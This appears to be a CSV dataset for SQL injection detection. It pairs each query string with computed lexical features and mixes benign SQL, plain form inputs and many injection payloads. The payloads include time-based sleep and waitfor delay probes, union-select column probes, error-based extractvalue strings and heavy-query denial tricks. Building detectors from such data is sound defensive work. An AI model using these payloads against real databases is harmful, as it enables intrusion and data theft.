,Query,no_single_qts,no_double_qts,no_punct,no_single_cmnt,no_mult_cmnt,no_space,no_perc,no_log_opt,no_arith,no_null,no_hexa,no_alpha,no_digit,len_of_chr_char_null,genuine_keywords,log_query_len,box_query_len
2892,1' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,1,0,57,0,0,69,0,11,0,0,0,91,45,10,1,5.817111159963204,9.19511653789066
19748,"select customername, contactname, city from customers where country  =  'brazil'; drop view view_name ; drop view [brazil customers];",2,0,11,0,0,17,0,0,0,0,0,103,0,0,1,4.890349128221754,7.157548893414895
17491,craggs,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
25583,select avg ( number ) from draw select sum ( sound ) ,0,0,4,0,0,12,0,0,0,0,0,37,0,0,4,3.970291913552122,5.391515666300752
13167,knio,0,0,0,0,0,0,0,0,0,0,0,4,0,0,0,1.3862943611198906,1.5376610839645055
12432,lakshmin,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
17133,guerra_russinov@weat.fj,0,0,3,0,0,0,0,0,0,0,0,20,0,0,0,3.1354942159291497,3.983240309714999
17642,84304826m,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
25863,select avg ( told )  from welcome  select sum ( yesterday ) ,0,0,4,0,0,12,0,0,0,0,0,42,0,0,4,4.0943445622221,5.615932130190505
16595,jamaal,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
19135,c,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0.0,0.0
3922,"1""  )   where 2702  =  2702 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",0,1,26,1,0,29,0,4,2,0,0,42,24,4,0,4.997212273764115,7.378587043391221
24314,select spend ( s ) from short inner join,0,0,2,0,0,8,0,0,0,0,0,30,0,0,2,3.688879454113936,4.897348914472564
30464,select * from  ( select fuel from citizen ) ,0,0,3,0,0,9,0,0,1,0,0,31,0,0,2,3.784189633918261,5.062431490914847
21343,select * from tune where capital between 'guess' and 'purple',4,0,5,0,0,9,0,1,1,0,0,47,0,0,1,4.110873864173311,5.646144513813471
27485,from  ( select distinct down from far ) ,0,0,2,0,0,8,0,0,0,0,0,29,0,0,1,3.688879454113936,4.897348914472564
20092,"  select if ( 500<1000, 5, 10 ) ;",0,0,6,0,0,8,0,0,0,0,0,8,10,0,1,3.49650756146648,4.571113592379885
13821,querando,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
5972,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""%""  =  """,0,3,20,0,0,23,1,1,0,1,0,41,14,2,0,4.852030263919617,7.079131308912657
8679,"-8491"" where 9043  =  9043 union all select 9043,9043,9043,9043,9043,9043,9043,9043,9043--",0,1,13,1,0,8,0,0,3,0,0,19,48,0,1,4.499809670330265,6.378649993862576
25273,select avg ( writer ) from metal,0,0,2,0,0,6,0,0,0,0,0,24,0,0,2,3.4657359027997265,4.519779854678687
27332,select * from worried where badly = 'week' fetch first 3 rows only,2,0,4,0,0,12,0,0,1,0,0,49,1,0,3,4.189654742026425,5.791153910047609
5162,"-9615  )   as dntk where 4780  =  4780 union all select 4780,4780,4780,4780,4780,4780,4780,4780#",0,0,11,0,0,11,0,0,1,0,0,25,44,0,1,4.564348191467836,6.504302289710709
5574,"-2625'  )   or elt  (  1032  =  1032,3623  )   and   (  'eliy'  =  'eliy",4,0,12,0,0,13,0,2,1,0,0,16,16,0,0,4.276666119016055,5.953276820822519
10820,"-7743"" or 9323  =  9323#",0,1,4,0,0,4,0,1,1,0,0,2,12,0,0,3.1780538303479458,4.05093304771096
21361,select care ( s from charge right join,0,0,1,0,0,7,0,0,0,0,0,30,0,1,2,3.6375861597263857,4.809458789423759
9546,select   (  case when   (  1961  =  2048  )   then 1961 else 1961*  (  select 1961 from information_schema.character_sets  )   end  )  #,0,0,12,0,0,21,0,0,1,0,0,65,20,1,2,4.912654885736052,7.2034003052594375
3782,-4494 or 5291  =  4452,0,0,2,0,0,4,0,1,1,0,0,2,12,0,0,3.091042453358316,3.9129887722739327
19908,"  select round ( 345.156,   0 ) ;",0,0,5,0,0,7,0,0,0,0,0,11,7,0,1,3.49650756146648,4.571113592379885
705," select * from users where id  =  1 or "";{"" or 1  =  1 -- 1",0,2,9,1,0,16,0,2,3,0,0,26,4,0,1,4.07753744390572,5.5852871348767055
9068,"1'   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   'wbsz'  =  'wbsz",4,0,39,0,0,63,0,2,2,0,0,109,55,0,7,5.817111159963204,9.19511653789066
15255,gomska.hopper@ebuy.com.bi,0,0,4,0,0,0,0,0,0,0,0,21,0,0,0,3.218875824868201,4.116261188933881
10978,"-2518' union all select 6818,6818,6818,6818,6818,6818#",1,0,8,0,0,4,0,0,1,0,0,14,28,0,1,3.9889840465642745,5.42506920217274
6488,"1"" and sleep  (  5  )  ",0,1,3,0,0,6,0,1,0,0,0,8,2,0,0,3.1354942159291497,3.983240309714999
19389,select option_value from wp_options where option_name  =  '_houzez_property_status_3139' limit 1,2,0,10,0,0,9,0,0,0,0,0,70,5,0,1,4.564348191467836,6.504302289710709
12588,2.53e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
5011,1%' and   (  2439  =  2555  )  *2555 and '%'  =  ',4,0,11,0,0,11,2,2,1,0,0,6,13,0,0,3.912023005428146,5.287509109454676
8285,-5880'   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113,1,0,34,0,0,54,0,1,7,0,0,61,38,8,1,5.541263545158426,8.559367492058051
1411,"1%'   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  '%'  =  '",4,0,25,0,0,36,2,2,1,0,0,111,12,0,2,5.3981627015177525,8.239578813982419
26286,"  select orders.brotherrid, employees.past, employees.support from ordersright join employees on orders.employeeid  =  employees.fenceid order by orders.mailid",0,0,9,0,0,15,0,0,0,0,0,132,0,0,3,5.068904202220232,7.528834455029986
30521,select education,0,0,0,0,0,1,0,0,0,0,0,15,0,0,1,2.772588722239781,3.4229084603450888
824," select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'",3,0,13,1,0,18,0,1,4,0,0,40,4,0,2,4.418840607796598,6.222685223035155
29563," select * from log order by shadow asc, season desc",0,0,2,0,0,10,0,0,1,0,0,39,0,0,2,3.9318256327243257,5.322755734775789
23910,select * from course where sink between '1996-07-01' and '1996-07-31',4,0,9,0,0,9,0,1,5,0,0,35,16,0,1,4.23410650459726,5.873719016140452
3303,"1,  (  select   (  case when   (  1609  =  1609  )   then waitfor delay '0:0:5' else 1609*  (  select 1609 from master..sysdatabases  )   end   )    )   ",2,0,17,0,0,26,0,0,1,0,0,65,20,0,2,5.030437921392435,7.448022400972698
17564,hartzenbusch 98,0,0,0,0,0,1,0,0,0,0,0,12,2,0,0,2.70805020110221,3.326353218260614
3669,"1' and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'cdgm' like 'cdgm",4,0,31,0,0,42,0,2,2,0,1,64,71,0,4,5.575949103146316,8.637897819477432
29929,"  select my,spoken from record where music = 'cross' union select lion, make from tight",2,0,5,0,0,14,0,0,0,0,0,67,0,0,2,4.465908118654584,6.313121924766899
17873,liliana,0,0,0,0,0,0,0,0,0,0,0,7,0,0,0,1.9459101490553128,2.25279015210122
17980,cadaqus,0,0,0,0,0,0,0,0,0,0,0,7,0,0,0,1.9459101490553128,2.25279015210122
6234,"1""   )    )    as aamh where 7432  =  7432   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",0,1,42,1,0,58,0,3,2,1,0,118,42,6,1,5.777652323222656,9.102587570813418
23486,select min ( whom )  as new from plastic,0,0,2,0,0,8,0,0,0,0,0,29,0,0,1,3.688879454113936,4.897348914472564
27432,select avg ( build ) from gradually,0,0,2,0,0,6,0,0,0,0,0,27,0,0,2,3.555348061489413,4.669921102482963
28126,select count ( park ) from title,0,0,2,0,0,6,0,0,0,0,0,24,0,0,2,3.4657359027997265,4.519779854678687
25289,select count ( giveid ) from neighborhood,0,0,2,0,0,6,0,0,0,0,0,33,0,0,2,3.713572066704308,4.939896154656966
7287,"1 where 3175  =  3175 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",0,0,13,1,0,20,0,1,3,0,0,36,21,0,2,4.709530201312334,6.791357624410744
24345,select * from complex where struck = 'chosen'  or measure = 'blood',4,0,7,0,0,11,0,1,1,0,0,48,0,0,1,4.204692619390966,5.819025031871101
23842,select distinct discover from author,0,0,0,0,0,4,0,0,0,0,0,32,0,0,1,3.58351893845611,4.717530264472627
20880,select * from thought fetch first 50 percent rows only,0,0,1,0,0,9,0,0,1,0,0,42,2,0,3,3.9889840465642745,5.42506920217274
466," select * from users where id  =  1 or \<\ union select null,@@version -- 1",0,0,8,1,0,15,0,1,3,1,0,46,2,1,2,4.31748811353631,6.030055566276218
25479,select * from after where price not between 10 and 20,0,0,1,0,0,10,0,2,1,0,0,38,4,0,1,3.970291913552122,5.391515666300752
22635,select count ( furnitureid ) from carry,0,0,2,0,0,6,0,0,0,0,0,31,0,0,2,3.6635616461296463,4.853884482035236
26419,"insert into roll ( silence, care, favorite, select, pink, save )  values  ( 'smallest', 'driven'. coming', 'tune', 'hope', 'tell', 'part' )  ",13,0,28,0,0,21,0,0,0,0,0,89,0,0,0,4.948759890378168,7.277936646208279
23569, update slipped set field = 'pleasant'where ocean = 'hungry',4,0,6,0,0,9,0,0,0,0,0,45,0,0,0,4.0943445622221,5.615932130190505
6902,"1%""   )    )    union all select null#",0,1,5,0,0,6,1,0,0,1,0,18,1,1,1,3.6375861597263857,4.809458789423759
15248,"c/ bascuana 52, 5-e",0,0,3,0,0,3,0,0,2,0,0,10,3,0,0,2.9444389791664403,3.684523708911846
29556,select * from hung where that = 'immediately'  or find = 'search',4,0,7,0,0,11,0,1,1,0,0,46,0,0,1,4.174387269895637,5.762920220853171
23033,"  select youngid as id, price as wrapped from simply",0,0,1,0,0,9,0,0,0,0,0,41,0,0,1,3.951243718581428,5.357417698153898
20864,"   select method,success,desk,buy,grandmother     (  (  subject join language on pile.bat =  pile.such )   inner join organizationon orders.alike =  dish.fillid ) ",0,0,14,0,0,20,0,0,0,0,0,117,0,0,3,5.093750200806762,7.581275718599696
27002,select * from fifth where    not north = 'furniture',2,0,4,0,0,8,0,1,1,0,0,37,0,0,1,3.951243718581428,5.357417698153898
7183,"1%""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""%""  =  """,0,4,19,0,0,20,2,2,0,0,0,14,10,0,0,4.61512051684126,6.603993955492575
1458,"1%'   )    )    union all select null,null,null,null#",1,0,8,0,0,6,1,0,0,4,0,30,1,4,1,3.970291913552122,5.391515666300752
9490,"select * from generate_series  (  8147,8147,case when   (  8147  =  6336  )   then 1 else 0 end  )   limit 1--",0,0,11,1,0,19,0,0,3,0,0,48,19,0,1,4.700480365792417,6.77328459478072
22063,select touch from dig union all select skill from folks order by porch,0,0,0,0,0,12,0,0,0,0,0,58,0,0,3,4.248495242049359,5.900560584269694
3751,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  ""%""  =  """,0,3,20,0,0,18,1,1,1,0,0,63,5,0,2,4.820281565605037,7.014493020202725
7462,1   )    )    as xbii where 2262  =  2262 or sleep  (  5  )  --,0,0,7,1,0,14,0,1,2,0,0,18,10,0,0,4.143134726391533,5.7053230539652695
30178,select * from read where slightly = 'remember' fetch first 3 rows only,2,0,4,0,0,12,0,0,1,0,0,53,1,0,3,4.248495242049359,5.900560584269694
5290,"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""hiwo"" like ""hiwo",0,4,16,0,0,20,0,2,0,0,1,30,21,0,0,4.812184355372417,6.9980558521596
18915,fauno,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,1.6094379124341005,1.8157827456852256
23935,"   select count ( uncle ) , day from family by instant",0,0,3,0,0,11,0,0,0,0,0,38,0,0,2,3.9889840465642745,5.42506920217274
15295,alcoholado sabaters,0,0,0,0,0,1,0,0,0,0,0,18,0,0,0,2.9444389791664403,3.684523708911846
26400,select cut from surface,0,0,0,0,0,3,0,0,0,0,0,20,0,0,1,3.1354942159291497,3.983240309714999
17450,allman,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
29130,select * from guess where reach between '1996-07-01' and '1996-07-31',4,0,9,0,0,9,0,1,5,0,0,35,16,0,1,4.23410650459726,5.873719016140452
2143,-3688'||  (  select 'pber' from dual where 7137  =  7137 order by 1#,3,0,9,0,0,12,0,1,1,0,0,30,13,0,2,4.219507705176107,5.846543550882007
11703,"umbria, 143,",0,0,2,0,0,1,0,0,0,0,0,6,3,0,0,2.4849066497880004,2.999482870035824
4439,"1""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""jywy"" like ""jywy",0,4,28,0,0,40,0,1,0,0,1,81,37,0,1,5.497168225293202,8.4601092374213
24542,select * from alone where    not kitchen = 'or',2,0,4,0,0,8,0,1,1,0,0,32,0,0,1,3.8501476017100575,5.178036175455065
28377,select * from nice where affect = 'decide'  and city = 'whenever',4,0,7,0,0,11,0,1,1,0,0,46,0,0,1,4.174387269895637,5.762920220853171
10849,1' where 6406  =  6406,1,0,2,0,0,4,0,0,0,0,0,5,9,0,0,3.091042453358316,3.9129887722739327
26525,delete from weigh,0,0,0,0,0,2,0,0,0,0,0,15,0,0,0,2.833213344056216,3.514446415767603
24222," select column_name ( s )  from connected,purple",0,0,4,0,0,7,0,0,0,0,0,36,0,0,1,3.871201010907891,5.215173163969822
7473,1'   )    )    as xirr where 2425  =  2425,1,0,4,0,0,8,0,0,0,0,0,11,9,0,0,3.737669618283368,4.981567234930947
19616,select sum ( quantity )  from orderdetails;,0,0,3,0,0,6,0,0,0,0,0,33,0,0,2,3.7612001156935615,5.022400427811018
21832,select * from smell  where roar not like '[review]%',2,0,6,0,0,8,1,1,1,0,0,37,0,0,1,3.951243718581428,5.357417698153898
24906,"   select city,four,spirit,temperature,jump     (  (  occur join stepped on occasionally.over =  till.compare )   inner join oppositeon orders.manner =  disappear.afternoonid ) ",0,0,14,0,0,20,0,0,0,0,0,131,0,0,3,5.176149732573829,7.756569853335825
22278,select * from bush where enter = 'hundred'  or coming = 'mud',4,0,7,0,0,11,0,1,1,0,0,42,0,0,1,4.110873864173311,5.646144513813471
14269,tremewan,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
26384,select hidden ( s from kill right join,0,0,1,0,0,7,0,0,0,0,0,30,0,0,2,3.6375861597263857,4.809458789423759
14575,lorber-albasiny@cortinasartesol.pa,0,0,3,0,0,0,0,0,1,0,0,31,0,0,0,3.5263605246161616,4.621137163019105
23502,select count ( thumb ) from elephant,0,0,2,0,0,6,0,0,0,0,0,28,0,0,2,3.58351893845611,4.717530264472627
402,&',1,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0.6931471805599453,0.7296931454567191
25099,"  select situation as evidence, customs as [policeman]  from fight",0,0,3,0,0,9,0,0,0,0,0,52,0,0,1,4.189654742026425,5.791153910047609
28403,select * from or where may = 'box' limit 3,2,0,4,0,0,9,0,1,1,0,0,28,1,0,1,3.737669618283368,4.981567234930947
11106,-8359  )   where 4430  =  4430 or 6872  =  6872--,0,0,6,1,0,9,0,1,3,0,0,7,20,0,0,3.8918202981106265,5.251655965920898
3563,"1"" and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""pmpk"" like ""pmpk",0,4,43,0,0,50,0,7,0,2,0,87,27,9,0,5.541263545158426,8.559367492058051
6933,"-1526'   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   'xpob'  =  'xpob",4,0,14,0,0,15,0,2,1,0,0,16,16,0,0,4.454347296253507,6.2908506611672514
14950,urrutia delems,0,0,0,0,0,1,0,0,0,0,0,13,0,0,0,2.6390573296152584,3.2241419783899143
9195,"1"" where 2642  =  2642 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",0,1,15,1,0,23,0,1,3,0,0,76,16,0,2,4.969813299576001,7.321582942195207
10681,"1""   )    )    as iqgd where 7611  =  7611 union all select null,null,null,null,null#",0,1,9,0,0,12,0,0,0,5,0,45,9,5,1,4.442651256490317,6.268357393526619
29930,"   select count ( about ) , sunlight from anywhere by together",0,0,3,0,0,11,0,0,0,0,0,46,0,0,2,4.127134385045092,5.675937336868984
21210,select top 3 * from met,0,0,1,0,0,5,0,0,1,0,0,16,1,0,2,3.1354942159291497,3.983240309714999
6729,"1%'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   '%'  =  '",4,0,16,0,0,15,2,2,0,0,0,13,13,0,0,4.406719247264253,6.199496085735905
14113,6.54e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
2238,1'  )   where 5871  =  5871,1,0,3,0,0,5,0,0,0,0,0,5,9,0,0,3.295836866004329,4.240494654101009
4328,"1 union all select null,null,null--",0,0,4,1,0,4,0,0,2,3,0,26,1,3,1,3.555348061489413,4.669921102482963
131,select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,0,0,7,1,0,15,1,1,3,0,0,24,5,0,1,4.007333185232471,5.458096843121287
19895,select 18 % 4;,0,0,2,0,0,3,1,0,0,0,0,6,3,0,1,2.6390573296152584,3.2241419783899143
7231,1'+  (  select 'wyxu' where 2555  =  2555 union all select null#,3,0,7,0,0,11,0,0,1,1,0,33,9,1,2,4.158883083359672,5.734313559436426
14542,aguzadera,0,0,0,0,0,0,0,0,0,0,0,9,0,0,0,2.19722457733622,2.593591245490939
22991,select * from field fetch first 50 percent rows only,0,0,1,0,0,9,0,0,1,0,0,40,2,0,3,3.951243718581428,5.357417698153898
6641,1'   )    )    as oyad where 7161  =  7161 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,5,0,20,1,0,30,0,3,2,0,0,64,23,0,1,5.062595033026967,7.515548459825613
1775,"1'  )   as rqzz where 4987  =  4987 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",1,0,32,1,0,42,0,4,2,1,0,63,32,6,0,5.342334251964811,8.116631409695737
4312,"1'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  'oacz'  =  'oacz",4,0,16,0,0,17,0,2,0,0,0,21,13,0,0,4.584967478670572,6.544698632292425
4978,"1'   )    )     )   union all select null,null,null,null,null,null,null--",1,0,12,1,0,7,0,0,2,7,0,42,1,7,1,4.290459441148391,5.97916802637938
19308,"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 13610 )  order by meta_id asc",0,0,10,0,0,15,0,0,0,0,0,71,5,0,2,4.634728988229636,6.642694885740106
4287,1'||  (  select 'ydvg' from dual where 7108  =  7108,3,0,7,0,0,9,0,1,0,0,0,23,9,0,1,3.951243718581428,5.357417698153898
20268,"   select rose, taste+ ', ' + money+ ' ' + stick+ ', ' + handsome as disappear  from guard",6,0,15,0,0,19,0,0,6,0,0,53,0,0,1,4.499809670330265,6.378649993862576
3543,-1192 order by 1#,0,0,2,0,0,3,0,0,1,0,0,7,5,0,1,2.833213344056216,3.514446415767603
15091,39638,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1.6094379124341005,1.8157827456852256
18510,zonc4o,0,0,0,0,0,0,0,0,0,0,0,5,1,0,0,1.791759469228055,2.0498957009511405
26175,select count ( dull )  from rhythm,0,0,2,0,0,6,0,0,0,0,0,25,0,0,2,3.5263605246161616,4.621137163019105
393," select * from users where id  =  1 union select  @ $,version  (    )   -- 1",0,0,9,1,0,16,0,0,3,0,0,40,2,0,2,4.330733340286331,6.055066595411042
18826,valdelinares,0,0,0,0,0,0,0,0,0,0,0,12,0,0,0,2.4849066497880004,2.999482870035824
15451,boisvert,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
26582,"  select orders.collectrid, employees.current, employees.kind from ordersright join employees on orders.employeeid  =  employees.settingid order by orders.fourid",0,0,9,0,0,15,0,0,0,0,0,134,0,0,3,5.081404364984463,7.555194009775804
6355,"1  )   as rbmn where 5948  =  5948 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",0,0,43,1,0,54,0,6,2,2,0,83,35,9,0,5.58724865840025,8.663567331224002
18235,alvaro-pagano@hiperpapel.an,0,0,3,0,0,0,0,0,1,0,0,24,0,0,0,3.295836866004329,4.240494654101009
5193,"-7088'||  (  select 'arol' from dual where 8891  =  8891 union all select 8891,8891,8891,8891,8891,8891,8891,8891#",3,0,16,0,0,13,0,1,1,0,0,37,44,0,2,4.736198448394496,6.8447556498973405
20203,select * from spend where gas = 'weather'  and  ( research = 'rising' or mine = 'molecular' ) ,6,0,12,0,0,18,0,2,1,0,0,62,0,0,1,4.543294782270004,6.463181585426342
13763,c/ mayolica 158 4a,0,0,1,0,0,3,0,0,1,0,0,10,4,0,0,2.8903717578961645,3.6015010896570807
